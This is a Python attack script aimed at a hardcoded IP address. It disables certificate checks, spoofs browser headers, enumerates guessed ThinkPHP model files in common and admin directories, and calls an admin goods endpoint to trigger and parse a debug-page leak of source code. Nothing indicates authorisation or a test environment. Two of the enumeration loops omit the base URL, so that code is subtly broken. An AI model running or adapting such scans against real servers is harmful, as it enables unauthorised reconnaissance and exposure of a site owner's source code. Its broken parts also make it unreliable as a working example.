#!/usr/bin/env python3
"""tp_common_model.py - 枚举common/model + 确认getExportGoods存在性"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}
BASE = "https://139.196.199.221"

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=8, context=ctx)
        return r.status, r.read(200000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def leak_lines(b):
    lines = {}
    for m in re.finditer(r'<li class="line-(\d+)"><code>(.*?)</code></li>', b, re.S):
        lines[int(m.group(1))] = re.sub(r'<[^>]+>', '', m.group(2))
    return lines

# 1. 枚举common/model (PHP文件存在->返回200类错误)
print("=== 1. common/model 枚举 ===", flush=True)
for m in ["Goods", "Good", "Product", "Order", "User", "Admin", "Brand", "Banner",
          "Type", "Category", "Spec", "Guige", "Attribute", "Log", "Config", "Member",
          "Customer", "Client", "Supplier", "Stock", "Finance", "Money", "Export", "Excel"]:
    st, b = get("/application/common/model/%s.php" % m)
    if st == 200 and len(b) > 30:
        print("  EXISTS: %s.php (size=%d)" % (m, len(b)), flush=True)
    elif st == 200:
        print("  ?? %s.php st=200 size=%d" % (m, len(b)), flush=True)

# 2. admin/model 全枚举
print("\n=== 2. admin/model 全枚举 ===", flush=True)
for m in ["Goods", "Good", "Product", "Order", "User", "Admin", "Brand", "Banner",
          "Type", "Category", "Spec", "Guige", "Attribute", "Log", "Config", "Member",
          "Customer", "Client", "Supplier", "Stock", "Finance", "Money", "Export",
          "GoodsType", "GoodsBrand", "GoodsTypeBrand", "GoodsGuige", "GoodsParameter",
          "GoodsParameterTemplate", "OrderList", "Goodsbrand", "Goodstype", "Goodsguige"]:
    st, b = get("/application/admin/model/%s.php" % m)
    if st == 200 and len(b) > 30:
        print("  EXISTS: %s.php (size=%d)" % (m, len(b)), flush=True)

# 3. 触发goods模型源码泄露
print("\n=== 3. goods模型方法触发 ===", flush=True)
st, b = get(BASE + "/admin/goods/getList.html?num=5")
l = leak_lines(b)
if l:
    print("  goods/getList leaked %d lines" % len(l), flush=True)
    for ln in sorted(l):
        print("    %4d: %s" % (ln, l[ln][:110]), flush=True)

print("=== DONE ===", flush=True)
